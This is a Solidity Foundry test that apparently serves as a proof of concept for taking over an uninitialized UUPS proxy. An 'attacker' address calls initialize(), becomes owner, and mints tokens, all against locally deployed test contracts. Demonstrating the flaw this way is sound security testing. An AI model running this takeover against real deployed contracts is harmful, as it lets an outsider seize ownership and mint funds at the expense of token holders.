// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {UUPSProxy} from "../src/UUPSProxy.sol";
import {TestToken} from "../src/TestToken.sol";

contract UUPS_Uninitialized is Test {
    TestToken public testToken;
    UUPSProxy public Proxy;
    address public attacker;

    function test_PoC() public {
        attacker = address(0x31337);
        testToken = new TestToken();
        Proxy = new UUPSProxy(address(testToken), "");
        
        vm.prank(address(attacker));
        
        (bool success, bytes memory data) = address(Proxy).call(abi.encodeWithSignature("initialize()"));
        assertEq(success, true, "[!] Initialisation Failed");
        
        (success, data) = address(Proxy).call(abi.encodeWithSignature("owner()"));        
        address owner = abi.decode(data, (address));
        
        assertEq(owner, address(attacker), "[!] Not Owner");

        vm.prank(address(attacker));

		(success, ) = address(Proxy).call(abi.encodeWithSignature("mint(uint256)", 31337));
        assertEq(success, true, "[!] Mint Failed");
        uint256 balance = TestToken(address(Proxy)).balanceOf(address(attacker));
        
        assertEq(balance, 31337);
    }
}